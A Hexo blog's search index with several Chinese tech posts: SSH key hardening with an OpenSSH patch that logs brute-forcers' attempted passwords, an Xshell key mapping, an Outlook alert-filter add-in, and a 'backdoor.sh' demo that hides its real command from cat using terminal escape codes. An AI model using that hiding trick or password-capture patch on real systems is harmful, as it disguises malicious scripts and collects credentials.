<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>给VPS加ssh爆破记录</title>
    <url>/2015/03/30/2015-03-30/</url>
    <content><![CDATA[<h1 id="添加ssh密钥验证"><a href="#添加ssh密钥验证" class="headerlink" title="添加ssh密钥验证"></a>添加ssh密钥验证</h1><p>最近发现个人VPS的ssh日志中总是有很多不明IP的连接请求，天天爆破ssh也是够勤奋的。<br>为了防止某天VPS真被爆了先给ssh加个密钥认证，首先执行</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure>
<img src="/2015/03/30/2015-03-30/ssh-keygen.jpg" class="">
<p>将生成好的密钥对妥善保存(在生成中可选将私钥用口令加密)。<br>将公钥(id_rsa.pub)上传到VPS上，并将其内容添加到对应登录账户的~&#x2F;.ssh&#x2F;authorized_keys文件中，注意.ssh目录的权限最好是700(我的是755好像也行)，authorized_keys的权限必须是600或644。这里权限问题坑比较多，属主貌似没多大问题(我的登录账户不是root，但文件和目录的属主都是root)。<br>修改&#x2F;etc&#x2F;ssh&#x2F;sshd_config文件，分别修改如下三项:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">RSAAuthentication yes</span><br><span class="line">PubkeyAuthentication yes</span><br><span class="line">PasswordAuthentication no</span><br></pre></td></tr></table></figure>
<p>一般不用root登的话也设置一下</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">PermitRootLogin no</span><br></pre></td></tr></table></figure>
<p>重启sshd服务<br>本地用Xshell添加刚才生成的私钥就可以连接VPS了(如果设置了加密口令则需要输入口令解密私钥)。<br>此时最基本的设置密钥登录就完成了，接下来我们修改open-ssh的代码来实现输出验证错误时的密码。</p>
<h1 id="修改ssh源码"><a href="#修改ssh源码" class="headerlink" title="修改ssh源码"></a>修改ssh源码</h1><p>首先切换到一个临时目录执行apt-get source ssh，执行完后直接有一个openssh-6.6p1&#x2F; 目录和几个压缩包(我的VPS装的是DigitalOcean官方提供的Ubuntu镜像)，进入源码目录后首先写个patch:</p>
<img src="/2015/03/30/2015-03-30/patch-shot.jpg" class="">
<p>用ssh工程内的logit来写SYSLOG。写完patch后先</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">patch --dry-run &lt;sshlog.patch</span><br></pre></td></tr></table></figure>
<p>看是否有错误，没有错误的话就可以直接patch了。<br>到这里建议先备份一下&#x2F;etc&#x2F;ssh文件夹，再建个VPS的快照以防悲剧。。。<br>在源码目录执行配置</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./configure --prefix=/usr --sysconfdir=/etc/ssh --without-zlib-version-check --with-md5-passwords --mandir=/usr/share/man</span><br></pre></td></tr></table></figure>
<p>如果出错就安装缺少的软件包，下面是我安装时缺少的软件包:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">apt-get install zlib1g zlib1g.dev openssl libssl-dev</span><br></pre></td></tr></table></figure>
<p>(以上是ubuntu非主流命名的包名。。)<br>其中安libssl-dev的时候加了个 –fix-missing参数才没有出错。<br>configure顺利完成后执行make和make install，之后重启sshd服务(digitalocean的ubuntu下直接重启ssh)。<br>重启后先别急着退出，在当前会话下对比备份的ssh配置和新生成的ssh配置的不同，根据需要更改一下(这里最好不要改新生成的密钥，改了以后可能就要恢复快照了。。。)，然后新开几个会话看是否能成功连上VPS。</p>
<h1 id="更改账户认证策略"><a href="#更改账户认证策略" class="headerlink" title="更改账户认证策略"></a>更改账户认证策略</h1><p>以上完成后还要再修改一些配置，先在shadow里把root禁了(密码前加个!号)，之后重新修改sshd_config配置，主要注意以下几个：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">PermitRootLogin no</span><br><span class="line">RSAAuthentication yes</span><br><span class="line">PubkeyAuthentication yes</span><br><span class="line">AuthorizedKeysFile   %h/.ssh/authorized_keys</span><br></pre></td></tr></table></figure>
<p>注意下面这行实际上是针对所有其他账户的，<br>我的VPS上就2个账户，一个root不允许登录并且把shadow废了，<br>另一个常用账户在sudoers里，sudoers组登录策略另行配置</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">PasswordAuthentication yes</span><br></pre></td></tr></table></figure>
<p>在文件的最后(貌似Match有要求)添加如下内容: </p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Match Group sudo    #这里可能组名会不一样，wheel、sudoer什么的视情况而定</span><br><span class="line">PasswordAuthentication no  #禁止sudoers密码登录</span><br></pre></td></tr></table></figure>
<p>经过如上配置后只要用户名在sudoer里VPS是不允许密码登录的。<br>此时如果恰巧有人在爆破你的VPS你可以通过</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">tail -F /var/log/auth.log | grep sshlog</span><br></pre></td></tr></table></figure>
<p>看到，有些主机的日志可能在&#x2F;var&#x2F;log&#x2F;secure内，具体情况参照syslog.conf或rsyslog.conf的配置。</p>
<img src="/2015/03/30/2015-03-30/brute-log.jpg" class="">
<p>感受到了世界深深的恶意。。。</p>
<p>可以写个脚本或程序来定期提取这些密码记录，送上门的字典不要白不要。</p>
]]></content>
      <categories>
        <category>tech</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>vps</tag>
      </tags>
  </entry>
  <entry>
    <title>xshell设置ctrl+ ↑ ↓</title>
    <url>/2015/04/08/2015-04-08/</url>
    <content><![CDATA[<p>由screen转tmux，使用的时候发现tmux的pane大小只能左右调节不能上下调节，各种搜索后发现是xshell的问题，<strong>xshell</strong>这个坑竟然不响应ctrl+up和ctrl+down。。。<br>在centos下terminal里cat，然后输入ctrl+up 回车 和 ctrl+down 回车，分别得到”\x1B[1;5A”和”\x1B[1;5B”，其中\x1B代指控制符ESC，可以通过Alt+27按出来。复制输出的字符串，xshell工具-&gt;选项-&gt;键盘和鼠标-&gt;编辑-&gt;新建，加入ctrl+up，类型选择发送字符串，粘贴刚才复制的对应字符串，完成。</p>
<p>抽空买个mbp吧。</p>
]]></content>
      <categories>
        <category>tech</category>
      </categories>
      <tags>
        <tag>tools</tag>
      </tags>
  </entry>
  <entry>
    <title>A shell trick</title>
    <url>/2015/09/30/2015-09-30/</url>
    <content><![CDATA[<p>码瘟给我发了个好玩的东西</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">printf &#x27;#!/bin/bash\necho doing something evil!\nexit\n\033[2Aecho doing something very nice!\n&#x27; &gt;backdoor.sh</span><br><span class="line">chmod +x backdoor.sh</span><br><span class="line">cat backdoor.sh</span><br><span class="line">./backdoor.sh</span><br></pre></td></tr></table></figure>
<p>man ascii 查了下\033是ESC，理论上通过这种控制符能玩出很多花样。<br><span class="exturl" data-url="aHR0cHM6Ly96b3JrLm5ldC9+c3Qvam90dGluZ3MvTm90ZXNfb25fVGVybWluYWxfRW11bGF0aW9uLmh0bWw=" title="https://zork.net/~st/jottings/Notes_on_Terminal_Emulation.html">相关链接<i class="fa fa-external-link"></i></span></p>
]]></content>
      <categories>
        <category>tech</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>pentest</tag>
      </tags>
  </entry>
  <entry>
    <title>outlook邮件过滤插件</title>
    <url>/2015/07/15/2015-07-15/</url>
    <content><![CDATA[<p>天天收几百封告警邮件简直不能忍，刚好最近学py，用py写了个outlook插件练练手。<br>32位outlook，32位python2.7，32位pywin32库，以pywin32关于outlook的一个插件demo作基础改了改，实在不会vba。。。<br>去除了脚本里的敏感内容，顺带注释国际化了一下，代码如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># Outlook logmail filter written by p011ux 20150630</span></span><br><span class="line"><span class="comment"># usage:</span></span><br><span class="line"><span class="comment"># python outlookAddin.py </span></span><br><span class="line"><span class="comment"># python outlookAddin.py --unregister</span></span><br><span class="line"><span class="comment"># python outlookAddin.py --debug</span></span><br><span class="line"><span class="comment"># debug info in	   PythonWin --&gt; Tools --&gt; Trace Collector Debugging Tool</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> win32com <span class="keyword">import</span> universal</span><br><span class="line"><span class="keyword">from</span> win32com.server.exception <span class="keyword">import</span> COMException</span><br><span class="line"><span class="keyword">from</span> win32com.client <span class="keyword">import</span> gencache, DispatchWithEvents</span><br><span class="line"><span class="keyword">import</span> winerror</span><br><span class="line"><span class="keyword">import</span> pythoncom</span><br><span class="line"><span class="keyword">from</span> win32com.client <span class="keyword">import</span> constants</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">VersionInfo=<span class="string">u&quot;&quot;&quot;Log Filter Plugin v0.9 written by p011ux&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Forward to these email addr</span></span><br><span class="line">forwards=<span class="string">&#x27;&#x27;&#x27;alpha@company.com;beta@company.com&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># suspicious words,highlight line when match</span></span><br><span class="line">susp_words       =  u<span class="string">r&#x27;^(alpha|beta|else)\b&#x27;</span></span><br><span class="line">susp_words_white =  <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">susp_urls       =  u<span class="string">r&#x27;(://)|((\s|@)\d&#123;1,3&#125;(\.\d&#123;1,3&#125;)&#123;3&#125;)&#x27;</span></span><br><span class="line">susp_urls_white =  u<span class="string">r&#x27;\b((127(\.\d&#123;1,3&#125;)&#123;3&#125;(:(\d&#123;1,5&#125;)?)?\b)|(localhost(:\d&#123;1,5&#125;)?)&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># dict of blacklists and whitelists</span></span><br><span class="line">susp_dict=&#123;</span><br><span class="line">    <span class="string">&#x27;words&#x27;</span>:(susp_words,susp_words_white),\</span><br><span class="line">    <span class="string">&#x27;urls&#x27;</span>:(susp_urls,susp_urls_white),\</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># tmp folder</span></span><br><span class="line">BotFolder=<span class="string">&quot;_log_bot&quot;</span></span><br><span class="line"><span class="comment"># destination folder</span></span><br><span class="line">TargetFolder=<span class="string">&quot;_log&quot;</span></span><br><span class="line"><span class="comment"># log sender, only handle mails from these</span></span><br><span class="line">Log_Sender=(<span class="string">&quot;alarm-a&quot;</span>,<span class="string">&quot;alarm-b&quot;</span>)</span><br><span class="line"><span class="comment"># mail forward tag, make receiver easy to filter</span></span><br><span class="line">Log_Forward_Tag=<span class="string">&#x27;[log_tag] &#x27;</span></span><br><span class="line"></span><br><span class="line">log_usr=<span class="literal">None</span>      <span class="comment"># global dest obj</span></span><br><span class="line"><span class="comment"># Support for COM objects we use.</span></span><br><span class="line">gencache.EnsureModule(<span class="string">&#x27;&#123;00062FFF-0000-0000-C000-000000000046&#125;&#x27;</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">0</span>, bForDemand=<span class="literal">True</span>) <span class="comment"># Outlook 9</span></span><br><span class="line">gencache.EnsureModule(<span class="string">&#x27;&#123;2DF8D04C-5BFA-101B-BDE5-00AA0044DE52&#125;&#x27;</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">1</span>, bForDemand=<span class="literal">True</span>) <span class="comment"># Office 9</span></span><br><span class="line"></span><br><span class="line">outlookApp=<span class="literal">None</span>  <span class="comment">#outlook application object</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># The TLB defiining the interfaces we implement</span></span><br><span class="line">universal.RegisterInterfaces(<span class="string">&#x27;&#123;AC0714F2-3D04-11D1-AE7D-00A0C90F26F4&#125;&#x27;</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, [<span class="string">&quot;_IDTExtensibility2&quot;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># handle content of mail,return a list which contains line numbers of matched.</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">suspicious</span>(<span class="params">item</span>):</span><br><span class="line">    <span class="keyword">import</span> re                             <span class="comment"># for regex</span></span><br><span class="line">    liMatched=[]</span><br><span class="line">    body=item.Body.replace(<span class="string">u&#x27;\xa0&#x27;</span>,<span class="string">u&#x27; &#x27;</span>)  <span class="comment"># replace   in html format to space</span></span><br><span class="line">    body=body.replace(<span class="string">u&#x27;\r\n&#x27;</span>,<span class="string">u&#x27;\n&#x27;</span>)      <span class="comment"># traverse lines</span></span><br><span class="line">    cnt=<span class="number">0</span>                                 <span class="comment"># line counter</span></span><br><span class="line">    <span class="keyword">for</span> eachLine <span class="keyword">in</span> body.split(<span class="string">u&#x27;\n&#x27;</span>):</span><br><span class="line">        liLine=eachLine.split()           <span class="comment"># split to words</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="number">6</span>&gt;<span class="built_in">len</span>(liLine)):                <span class="comment"># get words[5]</span></span><br><span class="line">            <span class="keyword">if</span>(<span class="number">0</span>&lt;<span class="built_in">len</span>(liLine)):</span><br><span class="line">                <span class="built_in">print</span> <span class="built_in">len</span>(liLine),<span class="string">u&#x27;is less than 6&#x27;</span>,eachLine</span><br><span class="line">            cnt=cnt+<span class="number">1</span>                     <span class="comment"># line cnter</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        </span><br><span class="line">        cmd=<span class="string">u&#x27;&#x27;</span>                           <span class="comment"># recover words[5:]</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> liLine[<span class="number">5</span>:]:</span><br><span class="line">            cmd+=i</span><br><span class="line">            cmd+=<span class="string">u&#x27; &#x27;</span></span><br><span class="line">        cmd=cmd[:-<span class="number">1</span>]                      <span class="comment"># remove last space</span></span><br><span class="line">        cmd=cmd.lower()</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> susp_dict:</span><br><span class="line">            <span class="keyword">if</span>(<span class="literal">None</span> != re.search(susp_dict[i][<span class="number">0</span>],cmd)):                                      <span class="comment"># match blacklist</span></span><br><span class="line">                <span class="keyword">if</span>((<span class="literal">None</span> == susp_dict[i][<span class="number">1</span>]) <span class="keyword">or</span> (<span class="literal">None</span> == re.search(susp_dict[i][<span class="number">1</span>],cmd))):   <span class="comment"># if no white or not match white</span></span><br><span class="line">                    liMatched.append(cnt)                                                    <span class="comment"># get current line num</span></span><br><span class="line">                    <span class="keyword">break</span>                                                                    <span class="comment"># next line</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span> <span class="string">&#x27;White list:\t&#x27;</span>,cmd                                                <span class="comment"># print out white match</span></span><br><span class="line">        cnt=cnt+<span class="number">1</span>                         <span class="comment"># line cnter</span></span><br><span class="line">    <span class="comment">#now just return</span></span><br><span class="line">    <span class="keyword">return</span> liMatched</span><br><span class="line"></span><br><span class="line"><span class="comment"># adjust font and highlight</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">reform</span>(<span class="params">item,linesRed</span>):</span><br><span class="line">    htmB=item.HTMLBody        <span class="comment"># get content</span></span><br><span class="line">    offset=htmB.find(<span class="string">&#x27;&lt;P&gt;&#x27;</span>)   <span class="comment"># find main content</span></span><br><span class="line">    offset=offset+<span class="built_in">len</span>(<span class="string">&#x27;&lt;P&gt;&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># adjust font size</span></span><br><span class="line">    sizeStr=<span class="string">&#x27;&lt;FONT SIZE=&#x27;</span>                           <span class="comment"># general setting: &lt;P&gt;&lt;FONT SIZE=2&gt;</span></span><br><span class="line">    offset=htmB.find(sizeStr)                       <span class="comment"># get FONT SIZE position</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="number">0</span> &lt; offset):                                 <span class="comment"># got it?</span></span><br><span class="line">        offset = offset + <span class="built_in">len</span>(sizeStr)              <span class="comment"># adjust offset</span></span><br><span class="line">        offend = htmB.find(<span class="string">&#x27;&gt;&#x27;</span>,offset)              <span class="comment"># get end pos</span></span><br><span class="line">        <span class="keyword">if</span>(offset &lt; offend):                        <span class="comment"># got end?</span></span><br><span class="line">            fontsize = <span class="built_in">int</span>(htmB[offset:offend])     <span class="comment"># get font size int</span></span><br><span class="line">            htmB = htmB[:offset]+<span class="built_in">str</span>(fontsize+<span class="number">1</span>)+htmB[offend:]    <span class="comment"># size+=1</span></span><br><span class="line">            offset = offend + <span class="built_in">len</span>(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># highlight</span></span><br><span class="line">    linesRed=<span class="built_in">sorted</span>(linesRed)           <span class="comment"># sort line nums</span></span><br><span class="line">    cnt=<span class="number">0</span>                               <span class="comment"># cnter</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">if</span>(cnt <span class="keyword">in</span> linesRed):            <span class="comment"># match</span></span><br><span class="line">            htmB = htmB[:offset] + <span class="string">&#x27;&lt;font color=&quot;red&quot;&gt;&#x27;</span> + htmB[offset:]</span><br><span class="line">            offset = htmB.find(<span class="string">&#x27;&lt;BR&gt;&#x27;</span>,offset)</span><br><span class="line">            htmB = htmB[:offset] + <span class="string">&#x27;&lt;/font&gt;&#x27;</span> + htmB[offset:]</span><br><span class="line">            </span><br><span class="line">        offset = htmB.find(<span class="string">&#x27;\n&#x27;</span>,offset) + <span class="built_in">len</span>(<span class="string">&#x27;\n&#x27;</span>) <span class="comment"># next</span></span><br><span class="line">        cnt=cnt+<span class="number">1</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(cnt &gt; linesRed[-<span class="number">1</span>] <span class="keyword">or</span> offset &gt;= <span class="built_in">len</span>(htmB)):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">                </span><br><span class="line">    item.HTMLBody=htmB</span><br><span class="line"></span><br><span class="line"><span class="comment"># handle mail item</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">handleItem</span>(<span class="params">item</span>):</span><br><span class="line">    <span class="keyword">global</span> log_usr, outlookApp</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        sender=item.SenderName</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">not</span> sender <span class="keyword">in</span> Log_Sender):</span><br><span class="line">            <span class="comment"># not alarm</span></span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">    </span><br><span class="line">        linesMatched=suspicious(item)    <span class="comment"># match</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="number">0</span>==<span class="built_in">len</span>(linesMatched)):        <span class="comment"># no match?</span></span><br><span class="line">            <span class="comment"># irrelevant log, delete</span></span><br><span class="line">            <span class="comment"># print &#x27;Deleting&#x27;,item.Subject</span></span><br><span class="line">            item.Delete()</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">            </span><br><span class="line">        reform(item,linesMatched)        <span class="comment"># edit mail</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="literal">None</span> != log_usr):       	 <span class="comment"># forward mail and move it to destination folder</span></span><br><span class="line">            <span class="keyword">if</span>(<span class="number">0</span>&lt;<span class="built_in">len</span>(forwards)):</span><br><span class="line">                <span class="keyword">if</span>(<span class="literal">None</span>!=outlookApp):</span><br><span class="line">                    sendForward=outlookApp.CreateItem(constants.olMailItem)<span class="comment">#item.Forward()</span></span><br><span class="line">                    sendForward.Subject=Log_Forward_Tag+item.SenderName</span><br><span class="line">                    sendForward.To=forwards</span><br><span class="line">                    sendForward.HTMLBody=item.HTMLBody</span><br><span class="line">                    sendForward.DeleteAfterSubmit=<span class="literal">True</span></span><br><span class="line">                    sendForward.Send()   </span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span> <span class="string">&#x27;outlookApp is None&#x27;</span>                </span><br><span class="line">            item=item.Move(log_usr)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&#x27;log_usr is None&#x27;</span></span><br><span class="line">    <span class="keyword">except</span> AttributeError:</span><br><span class="line">        <span class="comment"># when registered with python.exe %0 --debug , print to Python Trace Collector</span></span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;Error handling&quot;</span>, <span class="built_in">repr</span>(item),<span class="string">&quot;in FolderEvent&quot;</span></span><br><span class="line">            </span><br><span class="line"><span class="comment"># about</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ButtonEvent</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">OnClick</span>(<span class="params">self, button, cancel</span>):</span><br><span class="line">        <span class="comment"># print &#x27;ButtonEvent&#x27;</span></span><br><span class="line">        <span class="keyword">import</span> win32ui</span><br><span class="line">        win32ui.MessageBox(VersionInfo,<span class="string">u&quot;ABOUT&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> cancel</span><br><span class="line"></span><br><span class="line"><span class="comment"># callbacks</span></span><br><span class="line"><span class="comment"># handle mail when new mail arrived in specified folder, delete if not suspicious</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">FolderEvent</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">OnItemAdd</span>(<span class="params">self, item</span>):</span><br><span class="line">        handleItem(item)</span><br><span class="line"></span><br><span class="line"><span class="comment"># remove permanently when mail with specified sender arrived in Deleted box</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">DeletedEvent</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">OnItemAdd</span>(<span class="params">self, item</span>):</span><br><span class="line">        <span class="comment"># print &#x27;DeletedEvent&#x27;</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment">#print &#x27;Deleted:&#x27;,item.Subject,&#x27;From:&#x27;,item.SenderName</span></span><br><span class="line">            <span class="keyword">if</span>(item.SenderName <span class="keyword">in</span> Log_Sender):</span><br><span class="line">                item.Delete()</span><br><span class="line">        <span class="keyword">except</span> AttributeError,e:</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&quot;Delete&quot;</span>, <span class="built_in">repr</span>(item),<span class="string">&quot;from Deleted error.&quot;</span>,e</span><br><span class="line">        </span><br><span class="line"><span class="comment"># initialize each callback</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">OutlookAddin</span>:</span><br><span class="line">    _com_interfaces_ = [<span class="string">&#x27;_IDTExtensibility2&#x27;</span>]</span><br><span class="line">    _public_methods_ = []</span><br><span class="line">    _reg_clsctx_ = pythoncom.CLSCTX_INPROC_SERVER</span><br><span class="line">    _reg_clsid_ = <span class="string">&quot;&#123;0F47D9F3-598B-4d24-B7E3-92AC15ED27E2&#125;&quot;</span></span><br><span class="line">    _reg_progid_ = <span class="string">&quot;Python.Test.OutlookAddin&quot;</span></span><br><span class="line">    _reg_policy_spec_ = <span class="string">&quot;win32com.server.policy.EventHandlerPolicy&quot;</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">OnConnection</span>(<span class="params">self, application, connectMode, addin, custom</span>):</span><br><span class="line">        <span class="keyword">global</span> log_usr, outlookApp</span><br><span class="line">        outlookApp=application</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;OnConnection&#x27;</span></span><br><span class="line">        <span class="comment"># ActiveExplorer may be none when started without a UI (eg, WinCE synchronisation)</span></span><br><span class="line">        activeExplorer = application.ActiveExplorer()</span><br><span class="line">        <span class="keyword">if</span> activeExplorer <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&#x27;registering button&#x27;</span></span><br><span class="line">            bars = activeExplorer.CommandBars</span><br><span class="line">            toolbar = bars.Item(<span class="string">&quot;Standard&quot;</span>)</span><br><span class="line">            item = toolbar.Controls.Add(<span class="type">Type</span>=constants.msoControlButton, Temporary=<span class="literal">True</span>)</span><br><span class="line">            <span class="comment"># Hook events for the item</span></span><br><span class="line">            item = <span class="variable language_">self</span>.toolbarButton = DispatchWithEvents(item, ButtonEvent)</span><br><span class="line">            item.Caption=<span class="string">&quot;LogFilter&quot;</span></span><br><span class="line">            item.TooltipText = <span class="string">&quot;About&quot;</span></span><br><span class="line">            item.Enabled = <span class="literal">True</span></span><br><span class="line">            <span class="built_in">print</span> <span class="string">&#x27;registered&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># get folder objs</span></span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;Accessing folders&#x27;</span></span><br><span class="line">        inbox        = application.Session.GetDefaultFolder(constants.olFolderInbox)</span><br><span class="line">        deleted      = application.Session.GetDefaultFolder(constants.olFolderDeletedItems)</span><br><span class="line">        log_bot = inbox.Folders[BotFolder]</span><br><span class="line">        log_usr = inbox.Folders[TargetFolder]</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;Accessed&#x27;</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># filter bot folder in each start</span></span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;Filtering exists&#x27;</span></span><br><span class="line">        filterList=[]</span><br><span class="line">        <span class="keyword">for</span> iLog <span class="keyword">in</span> log_bot.Items:</span><br><span class="line">            filterList.append(iLog)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> filterList:</span><br><span class="line">            handleItem(i)</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;Filtered&#x27;</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># mesure Deleted after last filter</span></span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;Cleaning Deleted&#x27;</span></span><br><span class="line">        dellist=[]</span><br><span class="line">        <span class="keyword">for</span> iToDel <span class="keyword">in</span> deleted.Items:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">if</span>(iToDel.SenderName.encode(<span class="string">&#x27;gbk&#x27;</span>) <span class="keyword">in</span> Log_Sender):</span><br><span class="line">                    dellist.append(iToDel)</span><br><span class="line">            <span class="keyword">except</span> AttributeError,e:</span><br><span class="line">                <span class="built_in">print</span> <span class="string">&quot;Error removing&quot;</span>, <span class="built_in">repr</span>(item),<span class="string">&quot;from Deleted&quot;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> dellist:</span><br><span class="line">            i.Delete()</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;Cleaned&#x27;</span></span><br><span class="line">            </span><br><span class="line">        <span class="comment"># hook up</span></span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;Hooking folders&#x27;</span></span><br><span class="line">        <span class="variable language_">self</span>.deletedItems = DispatchWithEvents(deleted.Items, DeletedEvent)</span><br><span class="line">        <span class="variable language_">self</span>.LogFilter = DispatchWithEvents(log_bot.Items, FolderEvent)</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;Hooked&#x27;</span></span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">OnDisconnection</span>(<span class="params">self, mode, custom</span>):</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;OnDisconnection&quot;</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">OnAddInsUpdate</span>(<span class="params">self, custom</span>):</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;OnAddInsUpdate&quot;</span>, custom</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">OnStartupComplete</span>(<span class="params">self, custom</span>):</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;OnStartupComplete&quot;</span>, custom</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">OnBeginShutdown</span>(<span class="params">self, custom</span>):</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;OnBeginShutdown&quot;</span>, custom</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">RegisterAddin</span>(<span class="params">klass</span>):</span><br><span class="line">    <span class="keyword">import</span> _winreg</span><br><span class="line">    key = _winreg.CreateKey(_winreg.HKEY_CURRENT_USER, <span class="string">&quot;Software\\Microsoft\\Office\\Outlook\\Addins&quot;</span>)</span><br><span class="line">    subkey = _winreg.CreateKey(key, klass._reg_progid_)</span><br><span class="line">    _winreg.SetValueEx(subkey, <span class="string">&quot;CommandLineSafe&quot;</span>, <span class="number">0</span>, _winreg.REG_DWORD, <span class="number">0</span>)</span><br><span class="line">    _winreg.SetValueEx(subkey, <span class="string">&quot;LoadBehavior&quot;</span>, <span class="number">0</span>, _winreg.REG_DWORD, <span class="number">3</span>)</span><br><span class="line">    _winreg.SetValueEx(subkey, <span class="string">&quot;Description&quot;</span>, <span class="number">0</span>, _winreg.REG_SZ, klass._reg_progid_)</span><br><span class="line">    _winreg.SetValueEx(subkey, <span class="string">&quot;FriendlyName&quot;</span>, <span class="number">0</span>, _winreg.REG_SZ, klass._reg_progid_)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">UnregisterAddin</span>(<span class="params">klass</span>):</span><br><span class="line">    <span class="keyword">import</span> _winreg</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        _winreg.DeleteKey(_winreg.HKEY_CURRENT_USER, <span class="string">&quot;Software\\Microsoft\\Office\\Outlook\\Addins\\&quot;</span> + klass._reg_progid_)</span><br><span class="line">    <span class="keyword">except</span> WindowsError:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">import</span> win32com.server.register</span><br><span class="line">    win32com.server.register.UseCommandLine(OutlookAddin)</span><br><span class="line">    <span class="keyword">if</span> <span 